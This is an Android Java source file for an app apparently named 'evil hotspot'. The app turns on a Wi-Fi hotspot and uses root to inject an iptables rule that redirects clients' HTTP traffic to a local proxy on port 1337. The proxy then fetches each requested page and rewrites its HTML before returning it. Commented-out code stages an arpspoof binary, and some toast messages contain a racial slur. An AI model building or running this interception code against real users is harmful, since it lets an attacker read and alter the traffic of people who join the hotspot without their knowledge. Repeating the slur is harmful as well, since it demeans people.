package android.evilhotspot;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.StrictMode;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.jsoup.nodes.Document;
//List of android permissions:
//http://developer.android.com/reference/android/Manifest.permission.html

//How to get root permissions (will work only on rooted device/emulator:
//http://www.stealthcopter.com/blog/2010/01/android-requesting-root-access-in-your-app/

//Instructions how to get a adb shell on device
//http://android.stackexchange.com/questions/69108/how-to-start-root-shell-with-android-studio

//Phone saying "Read-only file system" when attempting to create a file in /system
//http://stackoverflow.com/questions/6066030/read-only-file-system-on-android
//# mount -o rw,remount /system  <-> # mount -o ro,remount /system

//PCAP ? not used in the app so far...:
//http://stackoverflow.com/questions/15557831/android-use-pcap-library

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    // default IP
    public static String SERVERIP = "192.168.43.1";
    // designate a port
    public static final int SERVERPORT = 1337;
    private TextView serverStatus;
    private Handler handler = new Handler();
    private ServerSocket serverSocket;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        //Register our buttons OnClickListener
        Button hsButton = (Button) findViewById(R.id.hsButton);
        hsButton.setOnClickListener(this);
        Button rtButton = (Button) findViewById(R.id.rtButton);
        rtButton.setOnClickListener(this);
        Button htmlButton = (Button) findViewById(R.id.htmlbutton);
        htmlButton.setOnClickListener(this);
        Button ruleButton = (Button) findViewById(R.id.iptablesButton);
        ruleButton.setOnClickListener(this);

        //Log.e("MyTemp", netInterface.getDisplayName());
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        serverStatus = (TextView) findViewById(R.id.serverStatusView);
        serverStatus.setTextColor(Color.parseColor("#F5DC49"));
        Thread proxy = new Thread(new httpThread());
        //proxy.setPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
        proxy.start();

        //Create an ApManager to turn hotspot on and off
        ApManager ap = new ApManager();
        //set up ApManager and make sure we start with AP off
        ApManager.setUp(getApplicationContext());
        //if (ApManager.isApOn())
        //    ApManager.configApState();
    }

    public class httpThread implements Runnable {
        private String request = "";
        private String line = "";
        protected Boolean work = true;
        private BufferedReader in;
        private PrintWriter out;
        public void run() {

            try {
                if (SERVERIP != null) {
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            serverStatus.setText("Listening on IP: " + SERVERIP);
                        }
                    });
                    serverSocket = new ServerSocket(SERVERPORT);
                    serverSocket.setSoTimeout(0);
                    while (work) {
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                serverStatus.setText("Listening on IP: " + SERVERIP);
                            }
                        });
                        // listen for incoming clients
                        final Socket client = serverSocket.accept();
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                serverStatus.setText("Accepted client socket");
                            }
                        });
                        //get request from client
                        try {
                            in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                            out = new PrintWriter(client.getOutputStream(), true);
                            request = "";
                            while ((line = in.readLine()) != null) {
                                Log.d("ServerActivity", line);
                                request += line + '\n';
                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    serverStatus.setText("Reading request");
                                }
                            });
                                //send response to client
                                if (line.isEmpty()){
                                    //find which host
                                    String url = "";
                                    Pattern p = Pattern.compile("Host:\\s(.*)");
                                    Matcher m = p.matcher(request);
                                    while (m.find()) {
                                        Log.d("REGEXP", m.group(1));
                                        url += m.group(1);
                                    }
                                    //find which file
                                    p = Pattern.compile("^GET\\s([^\\s]*)\\s");
                                    m = p.matcher(request);
                                    while (m.find()) {
                                        Log.d("REGEXP", m.group(1));
                                        url += m.group(1);
                                    }

                                    requestTask rt = new requestTask();
                                    String response = rt.doInBackground("http://"+url);
                                    response = HTMLEditor.editHTML(response);
                                    out.print(response);
                                    out.flush();
                                    handler.post(new Runnable() {
                                        @Override
                                        public void run() {
                                            serverStatus.setText("Sent response.");
                                        }
                                    });
                                    client.close();
                                    break;
                                }
                            }

                        } catch (Exception e) {
                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    serverStatus.setText("Oops. Connection interrupted. Please reconnect your phones.");
                                }
                            });
                            e.printStackTrace();
                        }

                    }
                } else {
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            serverStatus.setText("Couldn't detect internet connection.");
                        }
                    });
                }
            } catch (Exception e) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        serverStatus.setText("Error");
                    }
                });
                e.printStackTrace();
            }
        }
    }

    boolean flag = true;
    public void onClick(View v) {
        // default method for handling onClick Events for our MainActivity
        switch (v.getId()) {

            case R.id.hsButton:
                Log.d("BUTTONS", "hotspot button pressed");
                //if HS button was pressed turn on/off hotspot
                hsPressed();
                break;

            case R.id.htmlbutton:
                Log.d("BUTTONS", "html test button pressed");
                HTMLEditor.Reader(this.getApplicationContext());
                break;

            case R.id.rtButton:
                Log.d("BUTTONS", "root test button pressed");
                rtPressed();
                break;

            case R.id.iptablesButton:
                Log.d("BUTTONS", "inject rule button pressed");
                iptablesRulePressed((Button)findViewById(R.id.iptablesButton));
                break;
        }
    }

    //change current state of mobile hotspot
    private void hsPressed(){
        ApManager.configApState();
        //for changing button appearance when pressed
        Button btn = (Button) findViewById(R.id.hsButton);
        if (flag) {
            btn.setBackgroundResource(R.drawable.button_on);
            flag = false;
        } else {
            btn.setBackgroundResource(R.drawable.button_off);
            flag = true;
        }
    }

    //try to do something as root (root test)
    private void rtPressed(){
        //if root test was pressed attempt to do something as root
        ShellExecutor exe = new ShellExecutor();
        if (exe.isRootAvailable()){
            toastMessage("We got root niggah!");
        }
        else{
            if (exe.RunAsRootOutput("busybox id -u").equals("0"))
                toastMessage("We got root niggah!");
            else
                toastMessage("We don't have root my mans...");
        }
            //arpspoof (attempting to run a C program, build with NDK)
            //get resource handle
            //InputStream raw = getResources().openRawResource(R.raw.arpspoof);
            //saveFile("arpspoof", raw);
            //os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
    }

    //inject/remove iptables rule that will route http traffic to our app
    private int iptablesRulePressed(Button ruleButton){
        Process p;
        try {
            //Preform su to get root privileges
            p = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(p.getOutputStream());

            if (ruleButton.getText().toString().equals("Inject rule"))
                os.writeBytes("iptables -t nat -I PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337\n");
            else
                os.writeBytes("iptables -t nat -D PREROUTING 1\n");

            os.writeBytes("exit\n");
            os.flush();
            try {
                p.waitFor();
                if(p.exitValue() == 0){
                    toastMessage("success");
                    if (ruleButton.getText().toString().equals("Inject rule"))
                        ruleButton.setText("Remove rule");
                    else
                        ruleButton.setText("Inject rule");
                    return 0;
                }
            } catch (InterruptedException e){
                //Exit with 2 if we were rudely interrupted !
                toastMessage("failure, intrp. exeption");
                return 2;
            }
        } catch (IOException e) {
            e.printStackTrace();
            toastMessage("not root, I/O exeption");
            return 3;
        }
        return 0;
    }


    //for saving embedded raw binary blob as file that can be run on filesystem
    public int saveFile(String filename, InputStream raw ){
        try {
            FileOutputStream fos = openFileOutput(filename, Context.MODE_PRIVATE);
            int readbyte = 0;
            while(true) {
                readbyte = raw.read();
                if(readbyte == -1) break;
                fos.write(readbyte);
            }
            fos.close();
            return 0;
        }
        catch( Exception e){
            e.printStackTrace();
            return 1;
        }
    }

    //function for debugging etc. (shows toast with msg text)
    public void toastMessage(String msg){
        Context context = getApplicationContext();
        int duration = Toast.LENGTH_SHORT;
        Toast toast = Toast.makeText(context, msg, duration);
        toast.show();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            startActivity(new Intent(this,SettingsActivity.class));
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
